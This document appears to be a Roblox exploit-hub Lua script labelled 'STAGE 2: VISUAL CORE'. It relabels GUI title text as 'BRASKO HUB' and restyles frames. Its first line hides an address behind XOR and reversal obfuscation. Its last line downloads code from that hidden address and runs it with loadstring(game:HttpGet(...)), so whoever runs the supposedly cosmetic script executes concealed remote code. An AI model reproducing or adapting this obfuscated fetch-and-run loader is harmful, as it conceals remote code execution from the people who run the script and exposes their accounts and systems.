
--[[ STAGE 2: VISUAL CORE ]]
local ZC1EYWDJZRUXqQTZJN="\243\221\233\205\224\214\243\009\194\048\000\057\250\062\038\032\019\089\088\089\064\119\122\078\101\040\046\065\158\131\141\179\141"local zYFbFl7ICIDc4=17 local jguUvH3QGT1zPPe=96 local AdaHd2l4g1wlQw5=1 local bFBepMmmHPY14h5W=6 local EzS8hH6UDSbkXQ=14 local kaxIg09aCsWEz3m8L6_=true local uyIP7m1lZBEuh14idbJoOb=bit32 and bit32.bxor if not uyIP7m1lZBEuh14idbJoOb then uyIP7m1lZBEuh14idbJoOb=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local WWNh8yPXvtgseRrzyNNR3X={}for ZtKgm5yUxaByVLYD6UQi=1,#ZC1EYWDJZRUXqQTZJN do local OVq1eBpluTHG=string.byte(ZC1EYWDJZRUXqQTZJN,ZtKgm5yUxaByVLYD6UQi)local qMep5sx4QiyMce0NW9=(jguUvH3QGT1zPPe+(ZtKgm5yUxaByVLYD6UQi*bFBepMmmHPY14h5W)+EzS8hH6UDSbkXQ)%256 if AdaHd2l4g1wlQw5==0 then OVq1eBpluTHG=(OVq1eBpluTHG-qMep5sx4QiyMce0NW9)%256 WWNh8yPXvtgseRrzyNNR3X[ZtKgm5yUxaByVLYD6UQi]=string.char(uyIP7m1lZBEuh14idbJoOb(OVq1eBpluTHG,zYFbFl7ICIDc4))else OVq1eBpluTHG=uyIP7m1lZBEuh14idbJoOb(OVq1eBpluTHG,zYFbFl7ICIDc4)WWNh8yPXvtgseRrzyNNR3X[ZtKgm5yUxaByVLYD6UQi]=string.char((OVq1eBpluTHG-qMep5sx4QiyMce0NW9)%256)end end local bMmW7L4EiSr1LaK=table.concat(WWNh8yPXvtgseRrzyNNR3X)if kaxIg09aCsWEz3m8L6_ then bMmW7L4EiSr1LaK=string.reverse(bMmW7L4EiSr1LaK)end local M4BvI34HpwvH=bMmW7L4EiSr1LaK
local HubName = "BRASKO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(M4BvI34HpwvH))()
